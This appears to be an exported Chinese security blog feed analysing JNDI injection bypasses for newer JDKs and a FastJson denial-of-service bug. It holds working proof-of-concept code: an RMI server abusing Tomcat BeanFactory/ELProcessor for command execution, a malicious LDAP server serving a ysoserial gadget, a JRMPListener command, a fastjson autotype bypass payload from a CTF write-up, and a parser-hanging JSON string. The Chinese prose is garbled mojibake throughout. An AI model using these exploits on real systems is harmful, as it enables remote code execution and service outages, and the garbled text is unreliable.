ËøôÈáå‰∏∫‰∫ÜÊé¢Á©∂ÂÖ∑‰ΩìÁöÑ‰øÆÊîπÁÇπÔºåË∑üËøõ‰∫Ü8u181Âíå8u201‰∏§‰∏™ÁâàÊú¨ÁöÑldapÂä†ËΩΩÊµÅÁ®ãÔºåËß£ÊûêcodebaseÁöÑÊµÅÁ®ã‰∏çÂèócom.sun.jndi.rmi.object.trustURLCodebase`com.sun.jndi.cosnaming.object.trustURLCodebaseÂ±ûÊÄßÂΩ±ÂìçÔºå‰ΩÜÂú®ÊúÄÂêéÂä†ËΩΩËøúÁ®ãclassÁöÑÂáΩÊï∞helper.loadClass(factoryName, codebase)È´òÁâàÊú¨8u201Êù°‰ª∂Ê∑ªÂä†‰∫ÜtrustURLCodebase`(ÈªòËÆ§‰∏∫false)ÁöÑÊ†°È™åÔºåÂ¶Ç‰∏ãÂõæÊâÄÁ§∫Ôºö ÁªïËøáJDK 8u191+Á≠âÈ´òÁâàÊú¨ÈôêÂà∂ÊâÄ‰ª•ÂØπ‰∫éOracle JDK 11.0.1„ÄÅ8u191„ÄÅ7u201„ÄÅ6u211ÊàñËÄÖÊõ¥È´òÁâàÊú¨ÁöÑJDKÊù•ËØ¥ÔºåÈªòËÆ§ÁéØÂ¢É‰∏ã‰πãÂâçËøô‰∫õÂà©Áî®ÊñπÂºèÈÉΩÂ∑≤ÁªèÂ§±Êïà„ÄÇÁÑ∂ËÄåÔºåÊàë‰ª¨‰æùÁÑ∂ÂèØ‰ª•ËøõË°åÁªïËøáÂπ∂ÂÆåÊàêÂà©Áî®„ÄÇ‰∏§ÁßçÁªïËøáÊñπÊ≥ïÂ¶Ç‰∏ãÔºö ÊâæÂà∞‰∏Ä‰∏™ÂèóÂÆ≥ËÄÖÊú¨Âú∞CLASSPATH‰∏≠ÁöÑÁ±ª‰Ωú‰∏∫ÊÅ∂ÊÑèÁöÑReference FactoryÂ∑•ÂéÇÁ±ªÔºåÂπ∂Âà©Áî®Ëøô‰∏™Êú¨Âú∞ÁöÑFactoryÁ±ªÊâßË°åÂëΩ‰ª§„ÄÇ Âà©Áî®LDAPÁõ¥Êé•ËøîÂõû‰∏Ä‰∏™ÊÅ∂ÊÑèÁöÑÂ∫èÂàóÂåñÂØπË±°ÔºåJNDIÊ≥®ÂÖ•‰æùÁÑ∂‰ºöÂØπËØ•ÂØπË±°ËøõË°åÂèçÂ∫èÂàóÂåñÊìç‰ΩúÔºåÂà©Áî®ÂèçÂ∫èÂàóÂåñGadgetÂÆåÊàêÂëΩ‰ª§ÊâßË°å„ÄÇ JRMPÔºöÁ©∫ÊåáÈíà-treasure-WriteupËøô‰∏âÁßçÊñπÂºèÈÉΩ‰æùËµñÂèóÂÆ≥ËÄÖÊú¨Âú∞CLASSPATH‰∏≠ÁéØÂ¢ÉÔºåÈúÄË¶ÅÂà©Áî®ÂèóÂÆ≥ËÄÖÊú¨Âú∞ÁöÑGadgetËøõË°åÊîªÂáª„ÄÇ Âà©Áî®Êú¨Âú∞Class‰Ωú‰∏∫Reference FactoryÁªïËøáÈ´òÁâàÊú¨ÈôêÂà∂Âú®‰∏äÊñá‰∏≠RMI + JNDI Reference PayloadÈÉ®ÂàÜÊàë‰ª¨Â∑≤Áªè‰ªãÁªç‰∫ÜÂú®È´òÁâàÊú¨‰øÆÂ§çÁ≠ñÁï•Ôºå‰ª•ÂèäÁªïËøáÁöÑÂà©Áî®Êù°‰ª∂„ÄÇÂú®org.apache.naming.factory.BeanFactory‰∏≠ÂàöÂ•ΩÊª°Ë∂≥Êù°‰ª∂Âπ∂‰∏îÂ≠òÂú®Ë¢´Âà©Áî®ÁöÑÂèØËÉΩÔºåËØ•Êé•Âè£Â≠òÂú®‰∫éTomcat‰æùËµñÂåÖ‰∏≠Ôºå‰ΩøÁî®‰πüÊòØÈùûÂ∏∏ÂπøÊ≥õ„ÄÇ ÁéØÂ¢ÉÊê≠Âª∫‰πãÂâçÁî®pom.xmlÊãâtomcatÁöÑÂåÖÂ§çÁé∞ËúúÊ±ÅÂéüÂõ†Â§±Ë¥•ÔºåÂêéÊù•Áî®ÁöÑMxSrvsÈáåËá™Â∏¶ÁöÑtomcat‰æùËµñÂ§çÁé∞ÊàêÂäü‰∫Ü„ÄÇ‰∏∫‰∫Ü‰æø‰∫éÂàÜÊûêÂéªÂØº‰∏™Ê∫êÁ†ÅÔºåÊâæÂà∞ÂØπÂ∫îÁöÑÁâàÊú¨ÔºåÁÇπ‰∏ãÂõæÊâÄÁ§∫ÁöÑView AllÁÑ∂ÂêéÂéªideaÈáåÂØºÂÖ•Â∞±Ë°å‰∫Ü ÊºèÊ¥ûÂ§çÁé∞poc:Server.java123456789101112131415161718import com.sun.jndi.rmi.registry.ReferenceWrapper;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import javax.naming.StringRefAddr;import org.apache.naming.ResourceRef;public class Server &#123; public static void main(String[] args) throws Exception &#123; Registry registry = LocateRegistry.createRegistry(1099); ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "org.apache.naming.factory.BeanFactory", (String)null); resourceRef.add(new StringRefAddr("forceString", "a=eval")); resourceRef.add(new StringRefAddr("a", "Runtime.getRuntime().exec(\"open /Applications/Calculator.app/\")")); ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef); registry.bind("EvalObj", referenceWrapper); System.out.println("the Server is bind rmi://127.0.0.1:1098/EvalObj"); &#125;&#125; Client.java123456789import javax.naming.*;public class Client &#123; public static void main(String[] args) throws Exception &#123; String uri = "rmi://127.0.0.1:1099/EvalObj"; Context ctx = new InitialContext(); ctx.lookup(uri); // ËøîÂõûÂä†ËΩΩÁöÑËøúÁ®ãÂØπË±° &#125;&#125; ÊºèÊ¥ûÂàÜÊûê/org/apache/naming/factory/BeanFactory.java Ëøô‰∏™Á±ªÊª°Ë∂≥‰∏äËø∞ÊèêÂà∞ÁöÑÈ´òÁâàÊú¨Âà©Áî®ÁöÑ‰∏§‰∏™Êù°‰ª∂ÔºöBeanFactory.java#getObjectInstanceÔºå‰ªé‰∏äÊñáRMI + JNDIÊ≥®ÂÖ•ÁöÑËß¶ÂèëÊµÅÁ®ãÂàÜÊûê‰∏≠ÂèØ‰ª•Áü•ÈÅìÔºåÂèØÊéßÂèÇÊï∞‰∏∫objÂíåname„ÄÇËøôÈáåÈôêÂà∂‰∫Ü‰º†ÂÖ•ÁöÑÂØπË±°ÂøÖÈ°ª‰∏∫ResourceRefÁ±ªÔºåÈÄöËøáÂèçÂ∞ÑË∞ÉÁî®Âú®148Ë°åÂÆû‰æãÂåñ‰∫Ü‰∏Ä‰∏™Êó†ÂèÇÂØπË±°ÔºåÊÑèÂë≥ÁùÄbeanClassÂæóÊúâ‰∏Ä‰∏™Êó†ÂèÇÊûÑÈÄ†ÂáΩÊï∞Ôºö Êé•ÁùÄÂèñÂá∫key‰∏∫forceStringÁöÑÂÄºËøõË°å‰ª•,ÂàÜÂâ≤ÔºåÊãÜÂàÜ=ÈîÆÂÄºÂØπÔºåÂ≠òÂÖ•hashMapÂØπË±°‰∏≠Ôºö ÂÖ∂ÂêéÈÄöËøáÂèçÂ∞ÑÊâßË°åÊàë‰ª¨ÊåáÂÆöÁöÑ‰πãÂâçÊûÑÈÄ†ÁöÑÊñπÊ≥ïÔºåÂπ∂ÂèØ‰ª•‰º†ÂÖ•‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤Á±ªÂûãÁöÑÂèÇÊï∞Ôºö Âà∞ËøôÈáåÂà©Áî®ËøáÁ®ãÂ∞±ÁªìÊùü‰∫ÜÔºåÂÜçÊù•Ë∑ü‰∏Ä‰∏ãÂà©Áî®ÈôêÂà∂Â¶Ç‰ΩïÊª°Ë∂≥ÔºåÁ¨¨‰∏Ä‰∏™Êù°‰ª∂ÊòØ‰º†ÂÖ•ÁöÑÂØπË±°ÂøÖÈ°ªÊòØÂ±û‰∫éResourceRefÁ±ªÔºåÊé•ÁùÄË∞ÉÁî®‰∫Üref.getClassName()Ëé∑ÂèñbeanClassNameÔºå‰πüÂ∞±ÊòØÁõÆÊ†áÁ±ªÔºö Ë∑üËøõResourceRefÁ±ªÔºåËØ•Á±ª‰πüÊòØReferenceÁöÑÂ≠êÁ±ªÔºåÂú®ÂÆû‰æãÂåñÁöÑÊó∂ÂÄôÔºåÂèØ‰ª•ÈÄöËøáÊûÑÈÄ†ÊñπÊ≥ï‰º†ÂÖ•ÁõÆÊ†áclassÔºöÈÄöËøáË∞ÉÁî®Áà∂Á±ªÁöÑÊûÑÈÄ†ÊñπÊ≥ïÂÆûÁé∞ÊàêÂëòÂèòÈáèclassNameÁöÑËµãÂÄº ÂÜçÊù•BeanFactory.javaÁúã‰∏Ä‰∏ãref.get(&quot;forceString&quot;)ÊòØÂ¶Ç‰ΩïÂÆûÁé∞ÁöÑÔºåÊàë‰ª¨Ë¶ÅÂ¶ÇÊûúÊûÑÈÄ†pocÊéßÂà∂forceStringÂèÇÊï∞ÔºåÂêåÊ†∑ÁöÑ‰πüÊòØÂú®Reference.java‰∏≠ÈÄöËøáÈÅçÂéÜÊàêÂëòÂèòÈáèaddrsÊï∞ÁªÑÊù•ËøõË°åÂØªÊâæÔºö Âú®Reference.java‰∏≠ÊâæÂà∞ÊéßÂà∂addrsÂÖÉÁ¥†ÁöÑÂäûÊ≥ïÔºöË¶ÅÊ±ÇÊàë‰ª¨‰º†ÂÖ•‰∏Ä‰∏™RefAddrÁ±ªÂûãÁöÑaddrÔºåÂú®ÂÖ∂Â≠êÁ±ªÊúâ‰∏Ä‰∏™StringRefAddrÂáΩÊï∞ÔºöÊâÄ‰ª•ÂèØ‰ª•ÈÄöËøáËøôÊ†∑ÁöÑÊñπÂºèÊù•ËÆæÁΩÆÂ±ûÊÄßÔºö1new ResourceRef().add(new StringRefAddr("forceString", "xxx")) Âú®veracodeÂçöÂÆ¢‰∏≠ÊûÑÈÄ†ÁöÑbeanClassÊòØjavax.el.ELProcessorÔºåELProcessor‰∏≠Êúâ‰∏™eval(String)ÊñπÊ≥ïÂèØ‰ª•ÊâßË°åELË°®ËææÂºèÔºåjavax.el.ELProcessorÊòØTomcat8‰∏≠ÁöÑÂ∫ìÔºåÊâÄ‰ª•‰ªÖÈôêTomcat8ÂèäÊõ¥È´òÁâàÊú¨ÁéØÂ¢É‰∏ãÂèØ‰ª•ÈÄöËøáËØ•Â∫ìËøõË°åÊîªÂáª„ÄÇ Áøª‰∫Ü‰∏Ä‰∫õËµÑÊñôËøòÊúâ‰∏Ä‰∫õÂÖ∂‰ªñÁöÑÁ±ªÁ¨¶ÂêàÊù°‰ª∂ÂèØ‰ª•‰Ωú‰∏∫beanClassÊ≥®ÂÖ•Âà∞BeanFactory‰∏≠ÂÆûÁé∞Âà©Áî®ÔºåÊØîÂ¶ÇOrangeÂ∏àÂÇÖÁöÑJenkinsÊºèÊ¥ûÂÆûÁé∞Âà©Áî®ÔºåÂÖàÊåñ‰∏™Âùë„ÄÇ Âà©Áî®LDAPËøîÂõûÂ∫èÂàóÂåñÊï∞ÊçÆÔºåËß¶ÂèëÊú¨Âú∞GadgetÁªïËøáÈ´òÁâàÊú¨ÈôêÂà∂ÁõÆÂΩïÊòØ‰∏ÄÁßçÂàÜÂ∏ÉÂºèÊï∞ÊçÆÂ∫ìÔºåÁõÆÂΩïÊúçÂä°ÊòØÁî±ÁõÆÂΩïÊï∞ÊçÆÂ∫ìÂíå‰∏ÄÂ•óËÆøÈóÆÂçèËÆÆÁªÑÊàêÁöÑÁ≥ªÁªü„ÄÇLDAPÂÖ®Áß∞ÊòØËΩªÈáèÁ∫ßÁõÆÂΩïËÆøÈóÆÂçèËÆÆÔºàThe Lightweight Directory Access ProtocolÔºâÔºåÂÆÉÊèê‰æõ‰∫Ü‰∏ÄÁßçÊü•ËØ¢„ÄÅÊµèËßà„ÄÅÊêúÁ¥¢Âíå‰øÆÊîπ‰∫íËÅîÁΩëÁõÆÂΩïÊï∞ÊçÆÁöÑÊú∫Âà∂ÔºåËøêË°åÂú®TCP/IPÂçèËÆÆÊ†à‰πã‰∏äÔºåÂü∫‰∫éC/SÊû∂ÊûÑ„ÄÇÈô§‰∫ÜRMIÊúçÂä°‰πãÂ§ñÔºåJNDI‰πüÂèØ‰ª•‰∏éLDAPÁõÆÂΩïÊúçÂä°ËøõË°å‰∫§‰∫íÔºåJavaÂØπË±°Âú®LDAPÁõÆÂΩï‰∏≠‰πüÊúâÂ§öÁßçÂ≠òÂÇ®ÂΩ¢ÂºèÔºö JavaÂ∫èÂàóÂåñ JNDI Reference MarshalledÂØπË±° Remote Location (Â∑≤ÂºÉÁî®)LDAPÂèØ‰ª•‰∏∫Â≠òÂÇ®ÁöÑJavaÂØπË±°ÊåáÂÆöÂ§öÁßçÂ±ûÊÄßÔºö javaCodeBase objectClass javaFactory javaSerializedData ËøôÈáå javaCodebase Â±ûÊÄßÂèØ‰ª•ÊåáÂÆöËøúÁ®ãÁöÑURLÔºåËøôÊ†∑ÈªëÂÆ¢ÂèØ‰ª•ÊéßÂà∂ÂèçÂ∫èÂàóÂåñ‰∏≠ÁöÑclassÔºåÈÄöËøáJNDI ReferenceÁöÑÊñπÂºèËøõË°åÂà©Áî®„ÄÇ‰ΩÜÊòØÈ´òÁâàÊú¨JVMÂØπReference FactoryËøúÁ®ãÂä†ËΩΩÁ±ªËøõË°å‰∫ÜÂÆâÂÖ®ÈôêÂà∂ÔºåJVM‰∏ç‰ºö‰ø°‰ªªLDAPÂØπË±°ÂèçÂ∫èÂàóÂåñËøáÁ®ã‰∏≠Âä†ËΩΩÁöÑËøúÁ®ãÁ±ª„ÄÇ Ê≠§Êó∂ÔºåÊîªÂáªËÄÖ‰ªçÁÑ∂ÂèØ‰ª•Âà©Áî®ÂèóÂÆ≥ËÄÖÊú¨Âú∞CLASSPATH‰∏≠Â≠òÂú®ÊºèÊ¥ûÁöÑÂèçÂ∫èÂàóÂåñGadgetËææÂà∞ÁªïËøáÈôêÂà∂ÊâßË°åÂëΩ‰ª§ÁöÑÁõÆÁöÑ„ÄÇLDAP ServerÈô§‰∫Ü‰ΩøÁî®JNDI ReferenceËøõË°åÂà©Áî®‰πãÂ§ñÔºåËøòÊîØÊåÅÁõ¥Êé•ËøîÂõû‰∏Ä‰∏™ÂØπË±°ÁöÑÂ∫èÂàóÂåñÊï∞ÊçÆ„ÄÇÂ¶ÇÊûúJavaÂØπË±°ÁöÑ javaSerializedData Â±ûÊÄßÂÄº‰∏ç‰∏∫Á©∫ÔºåÂàôÂÆ¢Êà∑Á´ØÁöÑ obj.decodeObject() ÊñπÊ≥ïÂ∞±‰ºöÂØπËøô‰∏™Â≠óÊÆµÁöÑÂÜÖÂÆπËøõË°åÂèçÂ∫èÂàóÂåñ„ÄÇ ÂÅáËÆæÂÆ¢Êà∑Á´ØÂ≠òÂú®ÊúâÊºèÊ¥ûÁöÑApache-Commons-Collections-3.1ÔºåldapÊúçÂä°Á´ØËøîÂõû‰∏Ä‰∏™ysoserialÁîüÊàêÁöÑExpÔºö1java -jar ysoserial.jar CommonsCollections6 &apos;/Applications/Calculator.app/Contents/MacOS/Calculator&apos;|base64 ldapÊúçÂä°Á´Ø‰ª£Á†ÅÔºö12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697import com.unboundid.ldap.listener.InMemoryDirectoryServer;import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;import com.unboundid.ldap.listener.InMemoryListenerConfig;import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;import com.unboundid.ldap.sdk.Entry;import com.unboundid.ldap.sdk.LDAPException;import com.unboundid.ldap.sdk.LDAPResult;import com.unboundid.ldap.sdk.ResultCode;import com.unboundid.util.Base64;import javax.net.ServerSocketFactory;import javax.net.SocketFactory;import javax.net.ssl.SSLSocketFactory;import java.net.InetAddress;import java.net.MalformedURLException;import java.net.URL;import java.text.ParseException;public class LdapServer &#123; private static final String LDAP_BASE = "dc=example,dc=com"; public static void main (String[] args) &#123; String url = "https://127.0.0.1:80/#Exploit"; int port = 1389; try &#123; InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( "listen", InetAddress.getByName("0.0.0.0"), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println("Listening on 0.0.0.0:" + port); ds.startListening(); &#125; catch ( Exception e ) &#123; e.printStackTrace(); &#125; &#125; private static class OperationInterceptor extends InMemoryOperationInterceptor &#123; private URL codebase; public OperationInterceptor ( URL cb ) &#123; this.codebase = cb; &#125; @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123; String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try &#123; sendResult(result, base, e); &#125; catch ( Exception e1 ) &#123; e1.printStackTrace(); &#125; &#125; protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123; URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class")); System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl); e.addAttribute("javaClassName", "Exploit"); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf('#'); if ( refPos &gt; 0 ) &#123; cbstring = cbstring.substring(0, refPos); &#125; // Payload1: Return Evil Reference Factory// e.addAttribute("javaCodeBase", cbstring);// e.addAttribute("objectClass", "javaNamingReference");// e.addAttribute("javaFactory", this.codebase.getRef()); //Payload2: Return Evil Serialized Gadget try &#123; // java -jar ysoserial.jar CommonsCollections6 '/Applications/Calculator.app/Contents/MacOS/Calculator'|base64 e.addAttribute("javaSerializedData", Base64.decode("rO0ABXNyABFqYX...")); &#125; catch (ParseException e1) &#123; e1.printStackTrace(); &#125; result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); &#125; &#125;&#125; jdk8u201ÊµãËØïÁªìÊûúÔºö ËøôÁßçÁªïËøáÊñπÂºèÈúÄË¶ÅÂà©Áî®‰∏Ä‰∏™Êú¨Âú∞ÁöÑÂèçÂ∫èÂàóÂåñÂà©Áî®ÈìæÔºåÊù•ÁªìÂêàJNDIÊ≥®ÂÖ•ÁöÑÂÖ•Âè£Êù•Âà©Áî®„ÄÇ Âà©Áî®JRMPËß¶ÂèëÊú¨Âú∞gadgetJRMP(Java Remote Method Protocol)ÔºåJavaËøúÁ®ãÊñπÊ≥ïÂçèËÆÆÔºåÁ±ªÊØî‰∫éHTTPÂçèËÆÆÊòØÂü∫‰∫éTCP/IPÂçèËÆÆÔºåRMIÂç≥Âü∫‰∫éJRMPÂçèËÆÆ„ÄÇJRMPËßÑÂÆö‰∫ÜRMIÈÄö‰ø°ËøáÁ®ãÁöÑÊï∞ÊçÆÊ†ºÂºèÁ≠â„ÄÇ ‰ª•Á©∫ÊåáÈíàÂÖ¨ÂºÄËµõCTF-treasureËøôÈ¢ò‰∏∫‰æãÔºåÈ¢òÁõÆÊ∫êÁ†ÅÔºötreasureÈ´òÁâàÊú¨jdk8u201(ÈªòËÆ§‰∏çÂºÄËøúÁ®ãÁ±ªÂä†ËΩΩ)Ôºåfastjson1.2.61ÔºåÊ†áÂáÜÁöÑËß£ÊûêjsonÔºöme/firesun/treasure/controller/SubmitController.javaSubmitController.java‰∏≠ÂºÄÂêØ‰∫ÜautotypeÔºö ‰∏≠Èó¥‰ª∂‰∏≠LogAspect.javaÊ£ÄÊµãtypeÂÖ≥ÈîÆÂ≠óÔºåËøôÈáåÁî®\x16ËøõÂà∂ÁºñÁ†ÅÁªïÂ∞±Ë°å‰∫ÜÔºåÂú®‰πãÂâçÁöÑÊñáÁ´†Fastjson ÂèçÂ∫èÂàóÂåñËß¶ÂèëÊµÅÁ®ãÂàÜÊûê‰∏≠ÊúâÂàÜÊûê„ÄÇ Êé•ÁùÄÂ∞±ÊòØÂØªÊâæJNDIÊ≥®ÂÖ•ÁÇπÔºåÂÖ®Â±ÄÊêúlookup(Ôºö ËøòÊòØÊúâÁÇπÈóÆÈ¢òÔºåÊêú‰∏ç‰∫ÜclassÊñá‰ª∂ÔºåÂèØ‰ª•mvnÊãâ‰∏ãÊ∫êÁ†ÅÂÖ®Â±ÄÊêú/org/apache/commons/proxy/provider/remoting/RmiProvider.class‰∏≠Êúâ‰∏ÄÂ§ÑlookupÂáΩÊï∞Ë∞ÉÁî®ÔºöÂèÇÊï∞nameÂà©Áî®fastjsonËß£ÊûêjsonÊï∞ÊçÆËá™Âä®Ë∞ÉÁî®setXXÊñπÊ≥ïËÆæÁΩÆÔºöÂÜçÁúãÁúãregÂèòÈáè: RmiProvider.class#getRegistryÔºå‰πüÂ∞±ÊòØrmiÁöÑÂÆ¢Êà∑Á´ØÂÆûÁé∞ 123456789101112public class RmiProvider implements ObjectProvider &#123; private String host = "localhost"; private int port = 1099; //... private Registry getRegistry() &#123; try &#123; return this.clientSocketFactory != null ? LocateRegistry.getRegistry(this.host, this.port, this.clientSocketFactory) : LocateRegistry.getRegistry(this.host, this.port); &#125; catch (RemoteException var2) &#123; throw new ObjectProviderException("Unable to locate registry at " + this.host + ":" + this.port + ".", var2); &#125; &#125; //... ÊûÑÈÄ†‰∏Ä‰∏™JRMP ServerÔºåÂà©Áî®RMIËß¶ÂèëÔºåÂú®‰æùËµñÂ∫ìÈáåÂºïÁî®‰∫Ücommons-collections3.2,‰ΩøÁî®ysoserialÁöÑcommonscollections5Ôºö1java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1088 CommonsCollections5 &apos;/Applications/Calculator.app/Contents/MacOS/Calculator&apos; submitË∑ØÁî±ÂèëÈÄÅÔºö1&#123;&quot;@\u0074ype&quot;:&quot;org.apache.commons.proxy.provider.remoting.RmiProvider&quot;,&quot;host&quot;:&quot;127.0.0.1&quot;,&quot;port&quot;:&quot;1088&quot;,&quot;name&quot;:&quot;Object&quot;&#125; ÂêåÊ†∑‰πüË¶ÅÊ±Çclasspath‰∏≠ÁöÑÁ±ªÊúâÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÔºåÂÄüÂä©RegistryÁöÑÂÖ•Âè£ÂÆûÁé∞ÂëΩ‰ª§ÊâßË°å„ÄÇ Â∞èÁªìÊñáÁ´†Á†îÁ©∂‰∫ÜÂ§ö‰∏™jdkÁâàÊú¨ÁöÑÂ§öÁßçjndiÊ≥®ÂÖ•ÊñπÂºèÔºå‰ª•ÂèäÈ´òÁâàÊú¨Âà©Áî®ÈôêÂà∂ÂàÜÊûêÂíåÁªïËøáÊñπÂºèÔºåÊî∂Ëé∑È¢á‰∏∫‰∏∞ÂØå„ÄÇ ÂèÇËÄÉÊñáÁ´†Ôºö kingx: Ê∑±ÂÖ•ÁêÜËß£JNDIÊ≥®ÂÖ•‰∏éJavaÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂà©Áî® kingx: Â¶Ç‰ΩïÁªïËøáÈ´òÁâàÊú¨JDKÁöÑÈôêÂà∂ËøõË°åJNDIÊ≥®ÂÖ•Âà©Áî® Exploiting JNDI Injections in Java Welkin: ÊµÖÊûêJNDIÊ≥®ÂÖ•Bypass]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>ÊºèÊ¥ûÂàÜÊûê</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[FastJson ÊãíÁªùÊúçÂä°ÊîªÂáªÂàÜÊûê (]]></title>
    <url>%2F2020%2F02%2F01%2Ffastjson%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[FastJson ÊãíÁªùÊúçÂä°ÊîªÂáªÂàÜÊûê (&lt;=1.2.59)ÊúÄËøëÂú®ÁøªËµÑÊñôÁöÑÊó∂ÂÄôÂèëÁé∞‰∫ÜËøôÊ†∑‰∏Ä‰∏™ÊúâÊÑèÊÄùÁöÑÊºèÊ¥ûÔºåÁÆÄËÄåË®Ä‰πãÔºåÊºèÊ¥û‰∫ßÁîüÁöÑÂéüÂõ†ÊòØÂºÄÂèëÂØπËæìÂÖ•Êï∞ÊçÆËÄÉËôë‰∏çÂë®ÂÖ®ÔºåËá¥‰Ωø‰∏Ä‰∏™Á¥¢ÂºïÊåáÈíàË∂äÁïåÔºåÂØºËá¥ÊãíÁªùÊúçÂä°ÁöÑÈóÆÈ¢ò„ÄÇÊØîÂ¶ÇÊàë‰ª¨ËæìÂÖ•16ËøõÂà∂\x0aÔºåËÄåÂºÄÂèëÊú™ËÄÉËôëÂà∞ÊÅ∂ÊÑèÊîªÂáªËÄÖÂ¶ÇÊûúÂè™ËæìÂÖ•\xÔºåÂ∞Ü‰ºöÂØºËá¥Á¥¢ÂºïÊåáÈíàÂæÄÂêéÁßªÂä®‰∫Ü‰∏§‰∏™ÊåáÂêë‰∫ÜÊï∞ÊçÆ‰πãÂ§ñ(Ë∂äÁïå)ÁöÑÂú∞Êñπ. ÊºèÊ¥ûÂ§çÁé∞pom.xml123456&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.59&lt;/version&gt;&lt;/dependency&gt; poc:12345678import com.alibaba.fastjson.JSON;public class test &#123; public static void main(String[] args)&#123; String DEATH_STRING = &quot;&#123;\&quot;a\&quot;:\&quot;\\x&quot;;//ËæìÂÖ•Â≠óÁ¨¶‰∏≤ÈïøÂ∫¶‰∏∫8 JSON.parse(DEATH_STRING); &#125;&#125; ÊºèÊ¥ûÂàÜÊûêÂú®ËøôÁØáÊñáÁ´†Èáå‰ªãÁªç‰∫ÜfastjsonËß£Êûêjson‰∏≤ÁöÑÊú∫Âà∂ÔºöfastjsonÊ∫êÁ†ÅËß£ÊûêÔºöJSON TokenËß£ÊûêÔºåËøôÈáåÊàë‰ª¨ËÆ∞‰Ωèbp‰∏∫ËØªÂèñÂ≠óÁ¨¶‰∏≤ÁöÑÊåáÈíà„ÄÅsp‰∏∫Â≠óÁ¨¶ÁºìÂ≠òÂå∫Á¥¢ÂºïÂ∞±Â•Ω‰∫Ü: Áõ¥Êé•Êù•ÁúãËß£Êûê16ËøõÂà∂ÁöÑ‰ª£Á†Å‰ΩçÁΩÆÔºö/parser/JSONLexerBase.java#scanString Ë∑üËøõnextÂáΩÊï∞ÔºöJSONScanner.java#next()ÂÖàÁªôÁ¥¢ÂºïÊåáÈíàËøõË°å‰∫ÜËá™Â¢ûËµãÂÄºÔºåÊé•ÁùÄÂà§Êñ≠Á¥¢ÂºïÂíåÂÆûÈôÖÈïøÂ∫¶ÁöÑÊØîËæÉÔºåÂ¶ÇÊûúÁ¥¢ÂºïÊØîÂÆûÈôÖÈïøÂ∫¶ÈïøÊàñËÄÖÁõ∏Á≠âÂàôËøîÂõûEOI,Âê¶ÂàôËøîÂõûÂΩìÂâçÁ¥¢ÂºïÊåáÂêëÁöÑÂ≠óÁ¨¶ÔºöÁªèËøáÁ¨¨‰∏ÄÊ¨°ÁöÑnextÂ§ÑÁêÜÔºåÂ∑≤ÁªèËøîÂõûEOI(0x1A)‰∫ÜÔºö ‰ΩÜÊòØ‰ªñÂèàË∞ÉÁî®‰∫Ü‰∏ÄÊ¨°next(Âç≥ÈªòËÆ§‰ø°‰ªªÁî®Êà∑ËæìÂÖ•\xÂêéË∑ü‰∏§‰ΩçÂ≠óÁ¨¶)ÔºåÊ≠§Êó∂Á¥¢ÂºïÁöÑÊåáÈíàbp‰∏∫9‰∫ÜÔºåÂ∑≤ÁªèË∂äÁïå‰∫ÜÔºö ÁÑ∂ÂêéÁªèËøáputCharÂáΩÊï∞Ôºåbreak‰∫ÜswitchÂàÜÊîØÔºåÁªßÁª≠ËøõË°åËøô‰∏™Âæ™ÁéØÔºö Ë∑üËøõisEOFÂáΩÊï∞ÔºöJSONScanner.java#isEOFÔºöbp+1Â∑≤ÁªèËøúÂ§ß‰∫élen‰∫ÜÔºåËøô‰∏™Êù°‰ª∂Ê∞∏ËøúÂè™ËÉΩËøîÂõûfalse„ÄÇ Ë∑üËøõputCharÂáΩÊï∞ÔºåÂ¶ÇÊûúspÂíåÁºìÂ≠òÂ≠óÁ¨¶ÈïøÂ∫¶Áõ∏ÂØπÂêéÔºåÂàôÁî≥ËØ∑‰∏Ä‰∏™charÂç†Áî®ÂΩìÂâçsbuf.lengthÁöÑ‰∏§ÂÄçÔºöÊâÄ‰ª•ÊúÄÂêéÁöÑÁªìÊûúÂ∞±ÊòØËøõÂÖ•‰∏Ä‰∏™Ê≠ªÂæ™ÁéØ‰∏îÊàêÂÄçÁî≥ËØ∑ÂÜÖÂ≠òÔºö ÊúÄÂêéÂú®Êñ∞ÁâàÊú¨1.2.60‰∏≠Ôºå‰øÆÊîπ‰∫ÜisEOFÂáΩÊï∞ÁöÑÂà§Êñ≠Êù°‰ª∂ÔºöÂπ∂‰∏îÂ¢ûÂä†‰∫Üx1Âíåx2ÁöÑÊ†°È™åÔºö 